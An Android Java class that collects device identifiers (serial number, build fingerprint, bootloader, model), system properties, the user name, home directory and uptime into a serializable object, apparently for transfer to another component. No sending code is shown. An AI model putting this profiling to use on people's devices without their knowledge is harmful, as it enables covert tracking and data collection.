package Transfer;

import android.os.Build;
import android.os.Build.VERSION;
import android.os.SystemClock;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

public class _System implements Serializable {

  public String BOOTLOADER;
  public String BRAND;
  public String CPU_ABI;
  public String CPU_ABI2;
  public String DEVICE;
  public String DISPLAY;
  public String FILE_SEPARATOR;
  public String FINGERPRINT;
  public String HARDWARE;
  public String HOST;
  public String ID;
  public String JAVA_CLASS_PATH;
  public String JAVA_CLASS_VERSION;
  public String JAVA_COMPILER;
  public String JAVA_EXT_DIRS;
  public String JAVA_HOME;
  public String JAVA_IO_TMPDIR;
  public String JAVA_LIBRARY_PATH;
  public String JAVA_SPECIFICATION_NAME;
  public String JAVA_SPECIFICATION_VENDOR;
  public String JAVA_SPECIFICATION_VERSION;
  public String JAVA_VENDOR;
  public String JAVA_VENDOR_URL;
  public String JAVA_VERSION;
  public String JAVA_VM_NAME;
  public String JAVA_VM_SPECIFICATION_NAME;
  public String JAVA_VM_SPECIFICATION_VENDOR;
  public String JAVA_VM_SPECIFICATION_VERSION;
  public String JAVA_VM_VENDOR;
  public String JAVA_VM_VERSION;
  public String LINE_SEPARATOR;
  public String MANUFACTURER;
  public String MODEL;
  public String OS_ARCH;
  public String OS_NAME;
  public String OS_VERSION;
  public String PATH_SEPARATOR;
  public String PRODUCT;
  public String RADIO;
  public String SERIAL;
  public String TAGS;
  public String TYPE;
  public long UPTIME;
  public long UPTIME_WITHOUT_SLEEPS;
  public String USER;
  public String USER_DIR;
  public String USER_HOME;
  public String USER_NAME;
  public String VERSION_CODENAME;
  public String VERSION_SDK;

  public _System() {
    try {
      BOOTLOADER = Build.BOOTLOADER;
      BRAND = Build.BRAND;
      CPU_ABI = Build.CPU_ABI;
      CPU_ABI2 = Build.CPU_ABI2;
      DEVICE = Build.DEVICE;
      DISPLAY = Build.DISPLAY;
      FINGERPRINT = Build.FINGERPRINT;
      HARDWARE = Build.HARDWARE;
      HOST = Build.HOST;
      ID = Build.ID;
      MANUFACTURER = Build.MANUFACTURER;
      MODEL = Build.MODEL;
      PRODUCT = Build.PRODUCT;
      RADIO = Build.RADIO;
      SERIAL = Build.SERIAL;
      TAGS = Build.TAGS;
      TYPE = Build.TYPE;
      USER = Build.USER;
      VERSION_CODENAME = VERSION.CODENAME;
      VERSION_SDK = VERSION.SDK;
      FILE_SEPARATOR = getProperty("file.separator");
      JAVA_CLASS_PATH = getProperty("java.class.path");
      JAVA_CLASS_VERSION = getProperty("java.class.version");
      JAVA_COMPILER = getProperty("java.compiler");
      JAVA_EXT_DIRS = getProperty("java.ext.dirs");
      JAVA_HOME = getProperty("java.home");
      JAVA_IO_TMPDIR = getProperty("java.io.tmpdir");
      JAVA_LIBRARY_PATH = getProperty("java.library.path");
      JAVA_VENDOR = getProperty("java.vendor");
      JAVA_VENDOR_URL = getProperty("java.vendor.url");
      JAVA_VERSION = getProperty("java.version");
      JAVA_SPECIFICATION_VERSION = getProperty("java.specification.version");
      JAVA_SPECIFICATION_VENDOR = getProperty("java.specification.vendor");
      JAVA_SPECIFICATION_NAME = getProperty("java.specification.name");
      JAVA_VM_VERSION = getProperty("java.vm.version");
      JAVA_VM_VENDOR = getProperty("java.vm.vendor");
      JAVA_VM_NAME = getProperty("java.vm.name");
      JAVA_VM_SPECIFICATION_VERSION = getProperty("java.vm.specification.version");
      JAVA_VM_SPECIFICATION_VENDOR = getProperty("java.vm.specification.vendor");
      JAVA_VM_SPECIFICATION_NAME = getProperty("java.vm.specification.name");
      LINE_SEPARATOR = getProperty("line.separator");
      OS_ARCH = getProperty("os.arch");
      OS_NAME = getProperty("os.name");
      OS_VERSION = getProperty("os.version");
      PATH_SEPARATOR = getProperty("path.separator");
      USER_DIR = getProperty("user.dir");
      USER_HOME = getProperty("user.home");
      USER_NAME = getProperty("user.name");
      UPTIME = SystemClock.uptimeMillis();
      UPTIME_WITHOUT_SLEEPS = SystemClock.elapsedRealtime();
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }

  private String getProperty(String str) {
    return System.getProperty(str);
  }
}
